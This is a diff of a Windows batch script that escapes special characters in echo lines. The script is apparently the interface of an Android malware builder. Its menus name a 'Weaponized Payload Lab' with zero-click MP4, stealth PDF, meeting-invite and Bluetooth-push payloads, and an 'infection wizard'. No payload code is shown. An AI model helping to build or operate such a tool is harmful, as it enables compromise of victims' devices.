@@ -40,7 +40,7 @@ echo │     ██║     ██╔══██║██╔══██╗╚�
 echo │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │
 echo │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │
 echo │                                                                       │
-echo │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │
+echo │     ----------^> Android APK Builder ^| v1.6.0 Hardened ^<----------     │
 echo │                                                                       │
 echo │   The one's who MIND don't matter. The one's who MATTER don't mind.   │
 echo │                         DEVELOPED BY K4N3CO                           │
@@ -217,7 +217,7 @@ goto :eof
 
 :exploit_menu
 call :print_banner
-echo [>] Weaponized Payload Lab (Hardened Tier)
+echo [^>] Weaponized Payload Lab (Hardened Tier)
 echo.
 echo     1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite
 echo     4. Dolby Audio       5. ADB Script      6. Bluetooth Push
@@ -268,7 +268,7 @@ goto :exploit_menu
 
 :infection_wizard
 call :print_banner
-echo [>] STRATEGIC_INFECTION_WIZARD
+echo [^>] STRATEGIC_INFECTION_WIZARD
 echo     Step-by-step automated payload weaponization.
 echo.
 call :check_requirements
@@ -377,7 +377,7 @@ goto :eof
 
 :main_menu
 call :print_banner
-echo [>] Build Options:
+echo [^>] Build Options:
 echo.
 echo     1. Start Build (Configure & Build)
 echo     2. Generate Keystore Only
